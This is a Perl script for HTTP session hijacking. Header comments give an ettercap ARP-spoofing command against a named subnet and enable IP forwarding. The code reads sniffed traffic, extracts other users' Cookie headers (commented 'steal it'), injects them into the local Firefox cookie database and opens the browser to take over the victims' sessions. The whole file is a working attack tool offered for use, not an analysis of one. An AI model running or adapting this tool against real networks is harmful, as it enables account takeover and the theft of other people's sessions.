#!/usr/bin/perl
# ettercap -Tq -w ETTERCAP.cap -M arp:oneway /158.42.56.2-255/ /158.42.56.1/  -P autoadd
# echo 1>/proc/sys/net/ipv4/ip_forward
use strict;
use DateTime;
use Net::Pcap ':functions';
use Net::Pcap::Reassemble;
use NetPacket::Ethernet;
use NetPacket::IP;
use DBI;
use DBD::SQLite;

my ($top, $lst, $cookie_db, $file, $t, %box);

sub suicide {
 exit;
}

sub start_session {
  my %ref = %{$box{(keys(%box))[0]}};
  my $complete_host = (keys(%ref))[0];
  my ($basedomain) = $complete_host =~ /\.?([^\.]+\.[^\.]+)$/;
  my %cookies = %{$ref{$complete_host}};
  my $dbh = DBI->connect("dbi:SQLite:dbname=$cookie_db",'','', { AutoCommit => 1, sqlite_use_immediate_transaction => 1 });
  my $sth = $dbh->prepare(" DELETE FROM moz_cookies WHERE baseDomain LIKE '%$basedomain%' OR host LIKE '%$complete_host%' ");
  $sth->execute;
  my $expiry = DateTime->now->add( years => 2 )->epoch;
  foreach my $key (keys %cookies) { 
    $complete_host = '.' . $complete_host if ($complete_host eq $basedomain);
    $sth = $dbh->prepare(" INSERT INTO moz_cookies(name, value, baseDomain, host, path, expiry, isSecure, isHttpOnly)
			   VALUES('$key', '$cookies{$key}', '$basedomain', '.$basedomain', '/', $expiry, 0, 0) ");
    $sth->execute;
  }
  $dbh->disconnect;
  $complete_host =~ s/^\.//;
  system("firefox www.$basedomain &");
}

sub pick_mozilla_cookiedb {
  print "Trying to determine a local firefox cookie SQLite Database... ";
  open(my $moz_profiles, $ENV{HOME}."/Library/Application Support/Firefox/profiles.ini");
  my $db_path;
  while (my $row = <$moz_profiles>) {
    if ($row =~ /Path=/) {
      ($db_path) = $row =~ /Path=(.+)/;
      last;
    }
  }
  close $moz_profiles;
  my $db = $ENV{HOME}."/Library/Application Support/Firefox/".$db_path."/cookies.sqlite";
  if (-w $db) {
    print "OK $db\n";
  } else {
    die "ERROR: No firefox cookie database found.\n";
  }
  return $db;
}

sub store_cookie {
  my ($ref, $cookie) = @_;
  $cookie =~ s/\s//g;
  my @cookies = split(';', $cookie);
  foreach my $c (@cookies) {
    my ($name, $value) = $c =~ /^(.+)\=(.+)$/;
    ${$ref}->{$name} = $value;
  }
}

sub process_packet {
  shift;
  my ($header, $packet) = @_;
  my ($host, $cookie_hdr);
  if ($packet =~ /Cookie:/) { # If this packet contains a cookie... steal it ;)
    ($host) = $packet =~ /Host: ([^\cM]+)/;
    ($cookie_hdr) = $packet =~ /Cookie: ([^\cM\cJ]+)/;
    my $ip_obj = NetPacket::IP->decode(NetPacket::Ethernet::strip($packet));
    if (not exists $box{$ip_obj->{src_ip}}->{$host}) {
      my $ref = \$box{$ip_obj->{src_ip}}->{$host};
      store_cookie($ref, $cookie_hdr);
    }
  }
}

sub parse_capture {
  my ($err, $filter, $suffix);
  my $pcap = pcap_open_offline($file, \$err) or die "ERROR Can't read '$file': $err.\n";
  pcap_compile($pcap, \$filter, "tcp port 80 or tcp port 8080", 1, 0);
  pcap_setfilter($pcap, $filter);
  Net::Pcap::Reassemble::loop($pcap, 1000, \&process_packet, 0);
  pcap_close($pcap);
  pcap_freecode($filter);
}

$cookie_db = pick_mozilla_cookiedb;

die unless $ARGV[0];
$file = $ARGV[0];
$SIG{INT} = \&suicide;
parse_capture;
start_session;
